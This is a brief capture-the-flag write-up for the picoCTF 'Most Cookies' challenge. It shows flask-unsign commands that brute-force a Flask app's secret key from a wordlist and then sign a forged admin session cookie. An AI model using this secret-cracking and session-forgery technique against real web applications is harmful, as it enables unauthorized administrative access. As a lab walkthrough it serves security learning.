# Most Cookies

Observing the source key, we find that:

- There's a list of cookie names, from which one is chosen as app secret.
- `/search`ing stores the name as session cookie "very_auth:name", which if present in the above list redirects to `/display`
- To get the flag we need to have cookie as "very_auth:admin", but this is not in the cookie name list, so the redirection doesn't happen

Try to get the secret key using [flask-unsign](https://github.com/Paradoxis/Flask-Unsign):

```shell
flask-unsign --unsign --server 'http://mercury.picoctf.net:44693/' --wordlist cookie_list.txt
```

Create a signed cookie:

```shell
flask-unsign --sign --cookie "{'very_auth':'admin'}" --secret '<secret>'
```

Now, go to `/display`, edit the session cookie and reload
